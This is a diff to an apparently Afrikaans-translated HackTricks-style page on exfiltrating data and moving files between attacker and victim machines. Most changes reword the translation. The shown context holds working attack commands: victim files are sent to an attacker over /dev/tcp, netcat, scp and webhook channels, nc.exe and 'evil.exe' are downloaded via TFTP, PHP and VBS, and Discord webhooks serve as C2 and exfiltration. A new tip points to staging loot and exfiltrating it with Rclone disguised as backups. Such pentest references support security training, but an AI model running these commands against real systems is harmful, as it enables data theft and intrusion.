@@ -2,11 +2,18 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
+> [!TIP]
+> Vir 'n end-to-end voorbeeld van staging loot in `C:\Users\Public` en exfiltrating dit met Rclone om legitieme backups na te boots, sien die workflow hieronder.
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
 ## Algemeen whitelisted domeine om inligting te exfiltrate
 
 Kyk na [https://lots-project.com/](https://lots-project.com/) om algemeen whitelisted domeine te vind wat misbruik kan word
 
-## Copy\&Paste Base64
+## Kopieer\&Plak Base64
 
 **Linux**
 ```bash
@@ -42,11 +49,11 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Laai lêers op
+### Oplaai lêers
 
 - [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 - [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-- Python-moduul [uploadserver](https://pypi.org/project/uploadserver/):
+- Python-module [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -59,7 +66,7 @@ curl -X POST http://HOST/upload -H -F 'files=@file.txt'
 # With basic auth:
 # curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
 ```
-### **HTTPS-bediener**
+### **HTTPS Server**
 ```python
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -102,12 +109,12 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## Webhooks (Discord/Slack/Teams) vir C2 & Data Exfiltration
 
-Webhooks is write-only HTTPS-endpunte wat JSON en opsionele file parts aanvaar. Hulle word gewoonlik toegelaat na vertroude SaaS-domeine en vereis geen OAuth/API keys nie, wat dit nuttig maak vir low-friction beaconing en exfiltration.
+Webhooks is skryf-slegs HTTPS-eindpunte wat JSON en opsionele file-dele aanvaar. Hulle word dikwels toegelaat tot vertroude SaaS-domeine en vereis geen OAuth/API keys nie, wat hulle nuttig maak vir lae-wrywing beaconing en exfiltration.
 
-Belangrike idees:
-- Eindpunt: Discord gebruik https://discord.com/api/webhooks/<id>/<token>
-- POST multipart/form-data with a part named payload_json containing {"content":"..."} and optional file part(s) named file.
-- Operator-luspatroon: periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.
+Key ideas:
+- Eindpunt: Discord uses https://discord.com/api/webhooks/<id>/<token>
+- POST multipart/form-data met 'n deel genaamd payload_json wat {"content":"..."} bevat en opsionele file part(s) genaamd file.
+- Operator-loop patroon: periodieke beacon -> directory recon -> targeted file exfil -> recon dump -> sleep. HTTP 204 NoContent/200 OK bevestig aflewering.
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,7 +185,7 @@ Start-Sleep -Seconds 20
 }
 ```
 Aantekeninge:
-- Soortgelyke patrone geld vir ander samewerkingsplatforms (Slack/Teams) wat hul incoming webhooks gebruik; pas URL en JSON schema dienooreenkomstig aan.
+- Vergelykbare patrone geld ook vir ander samewerkingsplatforms (Slack/Teams) wat hul incoming webhooks gebruik; pas die URL en JSON schema dienooreenkomstig aan.
 - Vir DFIR van Discord Desktop cache artifacts en webhook/API recovery, sien:
 
 {{#ref}}
@@ -192,12 +199,12 @@ Aantekeninge:
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP-bediener (NodeJS)
+### FTP server (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
-### FTP-bediener (pure-ftp)
+### FTP bediener (pure-ftp)
 ```bash
 apt-get update && apt-get install pure-ftp
 ```
@@ -228,14 +235,14 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Kali as bediener
+Kali as server
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Of skep 'n smb share **met samba**:
+Of skep 'n smb share **using samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -266,7 +273,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-As die victim SSH het, kan die attacker 'n gids van die victim na die attacker mount.
+As die slagoffer SSH het, kan die aanvaller 'n gids van die slagoffer na sy eie masjien koppel.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,19 +286,19 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Laai lêer vanaf victim
+### Laai 'n lêer van die slagoffer af
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Lêer na die slagoffer oplaai
+### Laai lêer op na slagoffer
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-dank aan **@BinaryShadow\_**
+Danksy **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -313,33 +320,33 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-As jy data na 'n SMTP server kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
+As jy data na 'n SMTP-bediener kan stuur, kan jy 'n SMTP skep om die data met python te ontvang:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Standaard in XP en 2003 (in ander moet dit tydens installasie uitdruklik bygevoeg word)
+Per verstek in XP en 2003 (in ander moet dit tydens installasie uitdruklik bygevoeg word)
 
-In Kali, **start TFTP server**:
+Op Kali, **start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**TFTP bediener in python:**
+**TFTP-bediener in python:**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-In **slagoffer**, koppel aan die Kali-server:
+Op **victim**, verbind met die Kali server:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Laai 'n lêer af met 'n PHP oneliner:
+Laai 'n lêer af met 'n PHP-oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,7 +388,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Die `debug.exe`-program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om dit vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binary te verskaf, kan `debug.exe` die binary-lêer genereer. Dit is egter belangrik om te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte saam te stel**.
+Die `debug.exe` program laat nie net inspeksie van binaries toe nie, maar het ook die **vermoë om dit vanaf hex te herbou**. Dit beteken dat deur 'n hex van 'n binary te verskaf, kan `debug.exe` die binary-lêer genereer. Dit is egter belangrik om op te let dat debug.exe 'n **beperking het om lêers tot 64 kb in grootte te assembleer**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
